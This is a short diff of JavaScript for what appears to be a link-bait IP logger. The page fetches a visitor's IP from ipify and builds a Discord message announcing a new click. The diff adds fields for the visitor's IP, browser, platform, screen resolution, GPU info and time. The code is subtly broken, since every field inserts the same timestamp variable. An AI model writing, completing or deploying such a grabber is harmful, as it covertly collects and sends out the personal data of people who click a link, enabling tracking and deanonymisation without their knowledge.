@@ -30,9 +30,15 @@ fetch("https://api.ipify.org?format=json")
     }
 
     // Nachricht formatieren
-    const payload = {
+     const payload = {
       content: `# 📨 NEUER KLICK AUF DEN LINK!
-das ist aber nur ein test lol`
+**📌 IP-Adresse:** \`${zeitstempel}\`
+**🌐 Browsertyp:** \`${zeitstempel}\`
+**📱 Plattform:** \`${zeitstempel}\`
+**🖥️ Bildschirmauflösung:** \`${zeitstempel}\`
+**🎮 GPU Info (WebGL):** \`${zeitstempel}\`
+**⏰ Uhrzeit:** \`${zeitstempel}\`
+**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${zeitstempel}>`
     };
 
     // An Discord senden
